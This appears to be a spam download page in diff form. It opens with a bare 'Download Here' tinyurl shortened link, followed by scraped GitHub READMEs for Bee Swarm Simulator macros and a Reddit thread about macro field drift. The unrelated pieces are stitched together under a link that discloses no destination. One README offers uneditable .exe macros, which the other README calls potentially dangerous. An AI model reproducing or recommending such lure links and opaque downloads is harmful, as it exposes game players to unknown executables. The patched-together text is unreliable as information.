@@ -1,0 +1,365 @@
+Download Here ---> https://tinyurl.com/ycx3x5fn?id=2234613
+
+
+
+HydroxYT/Ciel-BSS-Macros
+
+
+This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.
+
+
+Name already in use
+
+
+A tag already exists with the provided branch name. Many Git commands accept both tag and branch names, so creating this branch may cause unexpected behavior. Are you sure you want to create this branch?
+
+
+Sign In Required
+
+
+Please sign in to use Codespaces.
+
+
+Launching GitHub Desktop
+
+
+If nothing happens, download GitHub Desktop and try again.
+
+
+Launching GitHub Desktop
+
+
+If nothing happens, download GitHub Desktop and try again.
+
+
+Launching Xcode
+
+
+If nothing happens, download Xcode and try again.
+
+
+Launching Visual Studio Code
+
+
+Your codespace will open once ready.
+
+
+There was a problem preparing your codespace, please try again.
+
+
+Latest commit
+
+
+Git stats
+
+
+Files
+
+
+Failed to load latest commit information.
+
+
+README.md 
+
+
+ADVANCED BEE SWARM SIMULATOR MACROS
+
+
+This macro is controlled by a batch file it's automates timers to the collectable.
+
+
+Join discord for get notified or you have more questions [DISCORD](https://discord.gg/qX4xXDEQd2
+
+
+
+  
+Macros has fully separated from each other
+
+  
+CMD UI (Checks your ping/Reconnection/Activitylog/Timered Ticket and Festive Feast, Wax, Antpass)
+
+  
+CMD Select a number which field you want to go.
+
+  
+Stable and safety use.
+
+  
+Updated for the new update
+
+  
+Blue Hives get more functions(Hive Balloon Collect)
+
+  
+All Hive
+
+  
+CMD Reconnection if you got a disconnection it will restart itself (paste your vip link in Settings.txt)
+
+  
+CMD Activitylog you can check everything what cmd do and what happend in past.
+
+  
+CMD Timered Collection it will collect every hour the ticket and every 1,5 hour the festive feast.
+
+  
+Stuck proof(if happens macro restart itself every 30 minutes)
+
+  
+Settings (you can't turn on or off what you want to collect)
+
+  
+LvL7 Reconnect mode (only turn on if your cmd can check ping) Opent a cmd (write to search bar) and open it. Type this command to the console without : ping -n 1 www.google.com | findstr TTL && Echo CODE WORKS(you can enable the mode) If you get response it works if not it won't.
+
+
+
+
+
+  
+You can't close the cmd while running the macro. (If you do other functions will be stop and only the aready running macro will run)
+
+  
+You can't edit the macros cuz it's exe files.
+
+
+
+
+
+  
+Sunflower
+
+  
+Strawberry
+
+  
+Pinetree
+
+  
+Bamboo
+
+  
+Pineapple
+
+  
+BlueFlower
+
+  
+Cactus
+
+  
+Pumpkin
+
+  
+Clover
+
+  
+Snail Killer (soon will gets a rework)
+
+  
+Bucko Bee Quests
+
+  
+(Soon Polarbear Quest, Rose, and what community needs)
+
+
+
+
+About
+
+
+This is a CMD version type macro for BeeSwarmSimulator
+
+
+Saberawr/bss
+
+
+This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.
+
+
+Name already in use
+
+
+A tag already exists with the provided branch name. Many Git commands accept both tag and branch names, so creating this branch may cause unexpected behavior. Are you sure you want to create this branch?
+
+
+Sign In Required
+
+
+Please sign in to use Codespaces.
+
+
+Launching GitHub Desktop
+
+
+If nothing happens, download GitHub Desktop and try again.
+
+
+Launching GitHub Desktop
+
+
+If nothing happens, download GitHub Desktop and try again.
+
+
+Launching Xcode
+
+
+If nothing happens, download Xcode and try again.
+
+
+Launching Visual Studio Code
+
+
+Your codespace will open once ready.
+
+
+There was a problem preparing your codespace, please try again.
+
+
+Latest commit
+
+
+Git stats
+
+
+Files
+
+
+Failed to load latest commit information.
+
+
+README.md 
+
+
+Bee Swarm Simulator Macros & Functions
+
+
+Our attempt at providing a powerful & easily extensible / editable function list for BSS beekeepers to create their own macros. Additionally, an open-source alternative to potentially dangerous compiled executables or less-powerful JitBit macros prevalent in the BSS community.
+
+
+
+  
+Easily configurable hotkeys, such as the default CTRL+P to play, CTRL+Q to stop
+
+  
+Reconnect to the game if you lost connection or the server restarted
+
+  
+Set cooldowns for any task (such as bug running every 20/30/60/any minutes, wealth clock every hour, ant pass every 2 hours) that persist through macro sessions
+
+  
+Place 1-4 sprinklers, jumping as necessary automatically
+
+  
+Support for emptying the hive balloon if desired
+
+  
+Fully configureable planter support & management including harvesting, replacing, and rotating them through fields defined in config.ini
+
+
+
+
+
+  
+Download & Install Autohotkey
+
+  
+Download this code and it's dependencies (Code -> Download ZIP) & unzip it into a directory of your choice.
+
+  
+Edit config.ini to your liking (NOT configuration.ahk - run reset config.ahk first if you don't have a config.ini file).
+
+  
+Put your sprinkler in the first slot of your hotbar ingame.
+
+  
+Run an included example such as sunf +bca.ahk or pine balloon.ahk or any user-created file, default hotkeys are CTRL+Q to stop, and CTRL+P to play.
+
+
+
+
+
+  
+Make sure your screen resolution is at least 800x600.
+
+  
+Make sure Windows Display Scaling is set to 100% (default).
+
+  
+If you have a dedicated GPU, make sure you don't have any settings enabled which change image fidelity (such as AI-powered resolution upscaling, system-wide anti-aliasing, etc.) - note that these are usually off by default.
+
+  
+Any of the three above issues can cause repeated reconnections due to the functions not properly detecting if you're connected or in-game, and you may have to recapture or resize the pictures inside the errors and images folders.
+
+  
+If your wind shrine donations aren't functioning properly, you may need to recapture wind_shrine_next_item.png due to the way roblox draws this character differently for every resolution.
+
+  
+Make sure you have your sprinkler in the first slot, and have edited config.ini
+
+  
+You can try running the reset config.ahk file and re-editing the fresh config.ini if these functions worked for you in the past but stopped working.
+
+
+
+
+
+  
+Browse through the comments inside functions.ahk to create your own macro, or take a look at the implementation in the included examples for ideas or inspiration. For example, the sunf +bca macro: 
+
+  
+Reconnects if disconnected
+
+  
+Activates the Wealth Clock every hour
+
+  
+Uses the free Ant Pass dispenser every 2 hours
+
+  
+Kills & loots Mondo Chick (make sure your system time is set correctly if you do this)
+
+  
+Does a bug run every 30 minutes, turning in polar bear quests & killing vicious bees on the way through 
+
+  
+Note: See the warnings in functions.ahk
+
+
+
+  
+Activating Beesmas machines
+
+  
+Placing, harvesting, looting, and rotating planters through fields as defined in config.ini
+
+  
+Donating to the Wind Shrine & activating a field booster
+
+  
+Farming Pine Tree Forest in a unique way designed for using the Tide Popper
+
+
+
+
+Using natro macro on E_lol, whats going on?
+
+
+Thank you for posting! This is just a reminder to maintain a happy environment and to please follow the subreddit rules!
+
+
+I am a bot, and this action was performed automatically. Please contact the moderators of this subreddit if you have any questions or concerns.
+
+
+Its happened with multiple fields too, pine i walk into the corner and stuff
+
+
+Field drift, there's no real way to fix it if you don't have ss but you could try different patterns that might minimise the time you end up away from the field
+
+
+Probably too slow. Their gear makes them go faster, so it’s equipped for them
+
+
+About Community
+
+
+Reddit and its partners use cookies and similar technologies to provide you with a better experience. By accepting all cookies, you agree to our use of cookies to deliver and maintain our services and site, improve the quality of Reddit, personalize Reddit content and advertising, and measure the effectiveness of advertising. By rejecting non-essential cookies, Reddit may still use certain cookies to ensure the proper functionality of our platform. For more information, please see our Cookie Notice and our Privacy Policy .
